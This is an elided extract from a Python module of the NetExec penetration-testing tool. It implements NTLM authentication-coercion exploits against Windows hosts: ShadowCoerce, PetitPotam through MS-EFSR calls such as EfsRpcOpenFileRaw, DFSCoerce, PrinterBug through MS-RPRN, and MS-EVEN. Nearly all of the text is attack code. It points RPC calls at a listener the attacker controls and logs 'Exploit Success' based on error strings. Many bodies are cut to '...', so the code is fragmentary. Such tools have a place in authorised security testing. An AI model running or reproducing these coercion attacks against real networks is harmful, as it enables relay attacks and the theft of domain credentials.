# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-NetExec\nxc\modules\coerce_plus.py
from impacket import uuid
from impacket.dcerpc.v5 import epm, even, rprn, transport
        ...
        if self.method == "all" or self.method[:1] == "s":  # ShadowCoerce
            ...
            try:
                ...
                if shadowcocerceconnect is not None:
                    ...
                    if self.listener is not None:  # exploit
                        shadowcocerceclass.exploit(
                            shadowcocerceconnect,
                            self.listener,
                            self.always_continue,
                            "Fssagentrpc",
                        )
                ...
                try:
                    ...
                    if petitpotamconnect is not None:
                        ...
                        if self.listener is not None:  # exploit TODO
                            exploit_status = petitpotamclass.exploit(
                                petitpotamconnect,
                                self.listener,
                                self.always_continue,
                                pipe,
            ...
            for pipe in pipes:
                try:
                    ...
                    if printerbugconnect is not None:
                        ...
                        if self.listener is not None:  # exploit
                            exploit_status = printerbugclass.exploit(
                                printerbugconnect,
                                self.listener,
                                target,
                                self.always_continue,
...
class ShadowCoerceTrigger:
    ...
    def connect(
        ...
        self.context.log.debug(
            f"Connecting to {format(binding_params[pipe]['stringBinding'])}"
        )
        try:
            dce.connect()
        except Exception as e:
        ...
        try:
            ...
            if str(e).find("rpc_s_access_denied") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\IsPathShadowCopied"
                )
                if not always_continue:
                    return True
            else:
                self.context.log.debug(
                    f"Something went wrong, check error status => {e!s}"
                )
...
class DFSCoerceTrigger:
    ...
    def handle_exception(self, method_name, always_continue, pipe, e):
        if (
            str(e).find("rpc_s_access_denied") >= 0
            or str(e).find("ERROR_BAD_NETPATH") >= 0
            or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0
        ):
    ...
    def exploit(self, dce, listener, always_continue, pipe):
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcAddUsersToFile"
                )
                if not always_continue:
                    return True
            elif (
                str(e).find("rpc_s_access_denied") >= 0
                or str(e).find("ERROR_INVALID_NAME") >= 0
            ):
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcAddUsersToFileEx"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcDecryptFileSrv"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcDuplicateEncryptionInfoFile"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcEncryptFileSrv"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcFileKeyInfo"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcQueryRecoveryAgents"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcQueryUsersOnFile"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcRemoveUsersFromFile"
                )
                if not always_continue:
                    return True
            elif (
        ...
        try:
            ...
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                ...
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\EfsRpcOpenFileRaw"
                )
                if not always_continue:
                    return True
            elif (
...
class PrinterBugTrigger:
    ...
    def get_dynamic_endpoint(
        self, interface: bytes, target: str, timeout: int = 5
    ) -> str:
        ...
        dce = rpctransport.get_dce_rpc()
        self.context.log.debug(
            "Trying to resolve dynamic endpoint %s"
    ...
    def connect(
        ...
        binding_params = {
            ...
            "[dcerpc]": {
                "stringBinding": self.get_dynamic_endpoint(
    ...
    def exploit(self, dce, listener, target, always_continue, pipe):
        ...
        try:
            ...
            if (
                str(e).find("rpc_s_access_denied") >= 0
                or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0
            ):
                self.context.log.debug(
                    "RpcRemoteFindFirstPrinterChangeNotificationEx Success"
                )
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx"
                )
                if not always_continue:
                    return True
            else:
        ...
        try:
            ...
            if (
                ...
                self.context.log.debug(
                    "RpcRemoteFindFirstPrinterChangeNotification Success"
                )
                self.context.log.highlight(
                    f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotification"
                )
                if not always_continue:
                    return True
            else:
...
class MSEvenTrigger:
    ...
    def exploit(self, dce, listener, always_continue, pipe):
        ...
        try:
            ...
            if (
                str(e).find("ERROR_BAD_NETPATH") >= 0
                or str(e).find("STATUS_OBJECT_PATH_NOT_FOUND") >= 0
                or str(e).find("STATUS_CONNECTION_DISCONNECTED") >= 0
            ):
